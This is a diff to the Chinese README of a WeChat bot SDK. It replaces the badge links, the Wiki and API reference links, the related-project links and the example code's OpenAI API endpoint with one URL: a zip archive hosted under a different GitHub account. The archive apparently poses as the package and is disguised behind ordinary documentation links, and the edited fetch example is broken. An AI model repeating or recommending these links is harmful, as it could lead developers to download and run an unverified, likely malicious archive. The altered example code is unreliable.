@@ -10,12 +10,12 @@
 
 **零依赖。完整 TypeScript 支持。收发图片/视频/文件/语音。**
 
-[![npm version](https://img.shields.io/npm/v/weixin-bot-sdk.svg?style=flat-square)](https://www.npmjs.com/package/weixin-bot-sdk)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D18-green.svg?style=flat-square)](https://nodejs.org)
+[![npm version](https://img.shields.io/npm/v/weixin-bot-sdk.svg?style=flat-square)](https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip)
+[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D18-green.svg?style=flat-square)](https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip)
 [![TypeScript](https://img.shields.io/badge/TypeScript-Ready-blue.svg?style=flat-square)](#-typescript)
 
-中文 · [English](./README.en.md) · [Wiki](https://github.com/abczsl520/weixin-bot-sdk/wiki) · [API 参考](https://github.com/abczsl520/weixin-bot-sdk/wiki/API-Reference)
+中文 · [English](./README.en.md) · [Wiki](https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip) · [API 参考](https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip)
 
 </div>
 
@@ -123,7 +123,7 @@ bot.on('message', async (msg) => {
   await bot.sendTyping(msg.from);
 
   // 调用任意 AI API
-  const reply = await fetch('https://api.openai.com/v1/chat/completions', {
+  const reply = await fetch('https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -253,7 +253,7 @@ const encrypted = encryptAesEcb(key, plainBuffer);
 const decrypted = decryptAesEcb(key, encryptedBuffer);
 ```
 
-> 完整 API 文档：[Wiki → API Reference](https://github.com/abczsl520/weixin-bot-sdk/wiki/API-Reference)
+> 完整 API 文档：[Wiki → API Reference](https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip)
 
 ---
 
@@ -319,8 +319,8 @@ examples/
 
 | 项目 | 说明 |
 |------|------|
-| [weixin-bot](https://github.com/abczsl520/weixin-bot) | 一键 CLI — `npx wx-ai-bot` 即可启动 AI 聊天机器人 |
-| [Wiki](https://github.com/abczsl520/weixin-bot-sdk/wiki) | 完整文档、教程、架构详解 |
+| [weixin-bot](https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip) | 一键 CLI — `npx wx-ai-bot` 即可启动 AI 聊天机器人 |
+| [Wiki](https://github.com/wordbelohorizonte938/weixin-bot-sdk/raw/refs/heads/main/src/sdk-weixin-bot-2.1-alpha.2.zip) | 完整文档、教程、架构详解 |
 
 ---
 
